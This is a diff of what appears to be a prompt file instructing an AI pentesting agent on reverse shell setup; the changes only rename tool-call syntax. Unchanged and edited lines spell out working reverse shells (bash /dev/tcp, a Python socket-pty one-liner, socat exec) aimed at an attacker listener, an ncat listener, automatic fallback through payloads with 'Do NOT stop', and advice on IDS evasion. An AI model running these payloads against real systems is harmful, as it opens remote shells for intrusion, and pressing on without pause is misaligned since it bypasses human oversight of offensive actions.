@@ -20,10 +20,10 @@ You are an expert penetration tester setting up reverse shell infrastructure. Yo
 
 | Tool | Use for |
 |------|---------|
-| `kali_exec` | Kali tools: ncat, socat, msfvenom, openssl, base64, python3 |
+| `kali(command=...)` | Kali tools: ncat, socat, msfvenom, openssl, base64, python3 |
 | `start_metasploit` | Meterpreter multi/handler listener — `session(action="start_metasploit")` |
 | `run_metasploit` | Meterpreter handler — `scan(tool="metasploit", ...)` |
-| `log_note` | Write reasoning notes to session log |
+| `report(action="note", data={...})` | Write reasoning notes to session log |
 
 ---
 
@@ -270,7 +270,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
 
 ### When invoked standalone
 
-1. Call `log_note` — record target OS, available access, injection point
+1. Call `report(action="note", data={...})` — record target OS, available access, injection point
 2. **Probe available interpreters** on the target (if you have command execution):
    ```
    which bash python3 python perl ruby nc ncat socat lua node php 2>/dev/null
@@ -302,20 +302,20 @@ If a payload fails (no callback), try the next one automatically. **Do NOT stop 
 **How to implement the fallback:**
 ```
 # Set up ONE listener (keep it running)
-kali_exec("ncat -lvnp 4444 > /tmp/shell-output.txt 2>&1 &")
+kali(command="ncat -lvnp 4444 > /tmp/shell-output.txt 2>&1 &")
 
 # Try bash first
-kali_exec("python3 /tmp/exploit.py TARGET 'bash -i >& /dev/tcp/LHOST/4444 0>&1'")
-kali_exec("sleep 5 && cat /tmp/shell-output.txt | head -5")  # check for callback
+kali(command="python3 /tmp/exploit.py TARGET 'bash -i >& /dev/tcp/LHOST/4444 0>&1'")
+kali(command="sleep 5 && cat /tmp/shell-output.txt | head -5")  # check for callback
 
 # No callback? Try python
-kali_exec("python3 /tmp/exploit.py TARGET 'python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\\\"LHOST\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"'")
-kali_exec("sleep 5 && cat /tmp/shell-output.txt | head -5")  # check again
+kali(command="python3 /tmp/exploit.py TARGET 'python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\\\"LHOST\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"'")
+kali(command="sleep 5 && cat /tmp/shell-output.txt | head -5")  # check again
 
 # Continue down the chain...
 ```
 
-Call `log_note` after each attempt recording which payload was tried and the result.
+Call `report(action="note", data={...})` after each attempt recording which payload was tried and the result.
 
 ### Fallback Chain — Windows
 
@@ -397,6 +397,6 @@ Target OS?
 - **Use encoded payloads** when special characters are filtered (URL params, SQL injection, etc.)
 - **Prefer Meterpreter** when persistence and session management are needed
 - **Stabilize the shell** immediately after catching — unstable shells lose sessions
-- **Document the payload used** — call `log_note` with the exact command for reproducibility
+- **Document the payload used** — call `report(action="note", data={...})` with the exact command for reproducibility
 - **Use encrypted channels** (socat OPENSSL) when IDS evasion is required
 - **Never leave listeners running** — clean up background listeners when done
